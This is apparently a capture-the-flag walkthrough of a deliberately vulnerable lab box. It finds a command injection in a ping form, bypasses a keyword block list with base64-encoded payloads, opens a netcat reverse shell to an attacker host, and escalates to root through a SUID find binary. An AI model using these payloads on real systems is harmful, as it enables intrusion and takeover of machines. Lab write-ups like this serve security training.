---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/haclabs-no_name,429/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

As usual we are starting with a simple port scan to detect the attack surface.

## port scan
```bash
$ nmap -Pn -p80 -sV 192.168.170.15
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-04 06:54 CEST
Nmap scan report for 192.168.170.15
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.170.15/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php       
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.170.15/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/08/04 06:54:17 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/admin                (Status: 200) [Size: 417]
/index.php            (Status: 200) [Size: 201]
/index.php            (Status: 200) [Size: 201]
/server-status        (Status: 403) [Size: 279]
Progress: 18392 / 18460 (99.63%)
===============================================================
2023/08/04 06:55:51 Finished
===============================================================

$ gobuster dir -k -u http://192.168.170.15/ -w /usr/share/wordlists/dirb/big.txt -t 5 -x txt,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.170.15/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/08/04 07:09:37 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/admin                (Status: 200) [Size: 417]
/index.php            (Status: 200) [Size: 201]
/server-status        (Status: 403) [Size: 279]
/superadmin.php       (Status: 200) [Size: 152]
Progress: 61349 / 61410 (99.90%)
===============================================================
2023/08/04 07:14:58 Finished
===============================================================
```

> The resource `/superadmin.php` looks interesting.
{: .prompt-info }

---

# exploitation
## analyzing `/superadmin.php` interface
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127.0.0.1&submitt=Submit

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 16:59:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 531
Connection: close
Content-Type: text/html; charset=UTF-8

<form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.026 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.013/0.021/0.026/0.007 ms
</pre>
```

The interface is a juicy target for command injection attacks.  
payload: `|id`
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127.0.0.1|id&submitt=Submit

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 17:00:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 217
Connection: close
Content-Type: text/html; charset=UTF-8

<form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

> Yes! Command injection is possible.
{: .prompt-info }

--- 

# post exploitation
## reverse shell

Playing around with reverse shell payloads shows that some kind of filter seems to be active. Lets review the `php` code of `superadmin.php`  
payload: `cat superadmin.php`
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127|cat%20superadmin.php&submitt=Submit

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 17:37:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 686
Connection: close
Content-Type: text/html; charset=UTF-8

<form method="post" action="">
...
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
...
```

> The application seems to filter every of the following strings: `; && / bin & ls nc dir pwd`
{: .prompt-danger }

We can use the following concept to bypass the filter.  
At first we `base64` encode our desired command.
```bash
$ echo "pwd" |base64
cHdkCg==
```

Then we construct the following payload
```bash
|`echo "cHdkCg==" |base64 -d`
```

Lets execute the request
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 64
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127|`echo%20%22cHdkCg==%22%20|base64%20-d`&submitt=Submit

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 17:42:45 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Connection: close
Content-Type: text/html; charset=UTF-8

<form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<pre>/var/www/html
</pre>
```

> Yes! We are able to bypass the filter.
{: .prompt-info }

Now lets use this technique to create a simple `nc` reverse shell.

Start listener on attacker machine
```bash
$ nc -lvp 80                                                  
listening on [any] 80 ...
```

Inject reverse shell payload  
netcat payload: `nc -e /bin/bash 192.168.45.223 80`  
encoded payload: `|echo "bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuMjIzIDgwCg==" |base64 -d`
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 64
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127|`echo%20%22bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuMjIzIDgwCg==%22%20|base64%20-d`&submitt=Submit
```

> Unfortunately we do not get a connection. Maybe `nc` is not available.
{: .prompt-danger }

payload: `ls -lsah /bin`  
Lets inspect which binaries are available on the target system.
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127|`echo%20%22bHMgLWxzYWggL2Jpbgo=%22%20|base64%20-d`&submitt=Submit

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 17:34:34 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 9517
Connection: close
Content-Type: text/html; charset=UTF-8

<form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<pre>total 13M
4.0K drwxr-xr-x  2 root root 4.0K Jan 27  2020 .
4.0K drwxr-xr-x 24 root root 4.0K Mar 14  2020 ..
1.1M -rwxr-xr-x  1 root root 1.1M Jun  7  2019 bash
...
 36K -rwxr-xr-x  1 root root  35K May 14  2018 nc.openbsd
 32K -rwxr-xr-x  1 root root  31K Apr 14  2017 nc.traditional
...
```

> There seems to be a so called traditional `netcat` . This might imply that `-e` parameter is available in this version.
{: .prompt-info }

New request to trigger the reverse shell
payload: `nc.traditional -e /bin/bash 192.168.45.223 80`
```http
POST /superadmin.php HTTP/1.1
Host: 192.168.192.15
Content-Length: 120
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.15
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.15/superadmin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pinger=127|`echo%20%22bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuMjIzIDgwCg==%22%20|base64%20-d`&submitt=Submit
```

Catch connection from target
```bash
$ nc -lvp 80                                                  
listening on [any] 80 ...
192.168.192.15: inverse host lookup failed: Unknown host
connect to [192.168.45.223] from (UNKNOWN) [192.168.192.15] 48528
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Yes! We finally have a reverse shell
{: .prompt-info }

## get first flag
```bash
cd home
ls
haclabs
yash
ls -lsah
total 16K
4.0K drwxr-xr-x  4 root    root    4.0K Jan 27  2020 .
4.0K drwxr-xr-x 24 root    root    4.0K Mar 14  2020 ..
4.0K drwxr-xr-x 16 haclabs haclabs 4.0K Mar 16  2020 haclabs
4.0K drwxr-xr-x  5 yash    yash    4.0K Jul 10  2020 yash
cd haclabs
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
flag2.txt
cat flag2.txt
I am flag2 

           ---------------               ----------------
                         
                     
                               --------

cd ..
ls
haclabs
yash
cd yash
ls
flag1.txt
local.txt
cat local.txt
6******************************4
```

## privilege escalation
The `find` binary under `/usr/bin` has the `suid` flag set.  
We can for example identify this by using [`https://github.com/Ha-L0/suidPWN`](https://github.com/Ha-L0/suidPWN) or `linpeas`.  
Looking at `gtfobins` shows a simple technique to escalate to `root` exploiting the `suid` bit.

```bash
www-data@haclabs:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

> Yes! It worked!
{: .prompt-info }

## get second flag
```bash
# cd /root
cd /root
# ls -lsah
ls -lsah
total 40K
4.0K drwx------  6 root root 4.0K Aug  4 22:29 .
4.0K drwxr-xr-x 24 root root 4.0K Mar 14  2020 ..
   0 -rw-------  1 root root    0 Jul 14  2020 .bash_history
4.0K -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
4.0K drwx------  2 root root 4.0K Jan 30  2020 .cache
4.0K drwx------  5 root root 4.0K Jan 30  2020 .config
4.0K drwx------  3 root root 4.0K Jan 27  2020 .gnupg
4.0K drwxr-xr-x  3 root root 4.0K Jan 27  2020 .local
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   32 Jul 14  2020 flag3.txt
4.0K -rw-r--r--  1 root root   33 Aug  4 22:29 proof.txt
# cat proof.txt
cat proof.txt
7******************************c
```

Pwned! <@:-)
